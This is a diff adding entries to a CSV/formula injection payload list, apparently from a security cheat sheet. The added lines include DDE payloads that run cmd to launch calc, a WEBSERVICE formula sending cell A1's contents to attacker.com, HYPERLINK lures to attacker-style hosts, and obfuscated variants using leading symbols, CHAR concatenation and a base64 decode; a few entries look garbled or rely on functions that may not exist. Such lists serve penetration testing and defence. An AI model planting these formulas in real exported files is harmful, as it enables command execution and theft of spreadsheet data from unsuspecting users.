@@ -3653,6 +3653,20 @@ CSV Injection, also known as Formula Injection, occurs when an application allow
 DDE ("cmd";"/C calc";"!A0")A0
 @SUM(1+1)*cmd|' /C calc'!A0
 =2+5+cmd|' /C calc'!A0
+=1+1
+=cmd|' /C calc'!A0
+=HYPERLINK("http://attacker.com","Click")
+=WEBSERVICE("http://attacker.com/p?x="&A1)
+=HYPERLINK("http://malicious.com")
+@SUM(1,2)
++SUM(5,5)
+-SUM(10,10)
+=SUM(9,9)
+\t=1+2
+"=HYPERLINK(""http://evil.com"")"
+=1+1;WEBSERVICE("http://attacker.com")
+=BASE64DECODE("PT1TVU0oMSwyKQ==")
+=CHAR(72)&CHAR(84)&CHAR(84)&CHAR(80)
 ```
 
 ### Pop Notepad
